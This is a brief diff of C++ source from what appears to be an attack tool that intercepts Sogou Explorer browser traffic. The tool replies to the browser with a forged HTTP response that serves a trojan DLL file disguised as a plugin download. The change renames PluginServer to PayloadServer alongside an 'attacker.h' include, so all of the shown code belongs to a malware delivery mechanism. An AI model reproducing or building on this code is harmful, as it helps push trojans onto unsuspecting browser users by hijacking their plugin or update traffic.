@@ -1,5 +1,5 @@
 #include "sogouExplorer.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "sslPublic.h"
 #include "../Public.h"
@@ -44,7 +44,7 @@ int SogouExplorer::replySogouExplorer(char * dstbuf, int dstbuflimit, LPHTTPPROX
 			"Content-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lphttp->username, DLLTROJAN_FILE_NAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
 		return 0;
 	}else if (gSogouExplorerFlag == 2)
 	{
